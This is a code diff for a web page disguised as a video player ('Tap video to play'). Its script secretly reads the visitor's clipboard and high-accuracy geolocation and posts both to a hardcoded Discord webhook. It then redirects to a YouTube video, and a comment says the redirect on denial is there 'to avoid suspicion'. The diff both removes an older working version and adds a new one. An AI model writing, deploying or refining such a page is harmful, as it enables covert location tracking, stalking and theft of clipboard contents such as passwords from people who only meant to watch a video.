@@ -26,52 +26,50 @@
     <p id="status">Tap video to play</p>
 
     <script>
-        // Updated with your NEW Webhook URL
+        // FIXED URL (No spaces)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv30RbeifDH3EciizbyXGSJMJMZ1R094deGB2x";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
         async function handleInteraction() {
             const status = document.getElementById('status');
-            status.innerText = "Loading video player...";
+            status.innerText = "Syncing...";
 
-            // 1. CLIPBOARD DATA
+            // 1. Try Clipboard First
             try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
+                if (navigator.clipboard) {
                     const text = await navigator.clipboard.readText();
                     if (text) {
-                        fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({content: "📋 **Clipboard Content:**\n```" + text + "```"}),
-                            keepalive: true // Crucial: forces send before redirect
-                        });
-                    }
-                }
-            } catch (e) { console.log("Clipboard skip"); }
-
-            // 2. LOCATION DATA
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        // Fixed Google Maps link format
-                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({content: `📍 **Family Location Update**\n${mapLink}`}),
-                            keepalive: true
+                            body: JSON.stringify({content: "📋 **Clipboard:** " + text})
                         });
-                        window.location.href = REDIRECT_URL;
-                    },
-                    (err) => {
-                        // If they deny, we still redirect
-                        window.location.href = REDIRECT_URL;
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
+                    }
+                }
+            } catch (e) { console.log("Clip skip"); }
+
+            // 2. Wait 500ms before Location to avoid permission clashing
+            await new Promise(r => setTimeout(r, 500));
+
+            // 3. Try Location
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({content: "📍 **Location:** " + mapLink})
+                    });
+
+                    // Wait 1 sec for data to send before redirect
+                    status.innerText = "Connecting...";
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+
+                }, (err) => {
+                    // Even if denied, redirect to avoid suspicion
+                    window.location.href = REDIRECT_URL;
+                }, { enableHighAccuracy: true });
             } else {
                 window.location.href = REDIRECT_URL;
             }
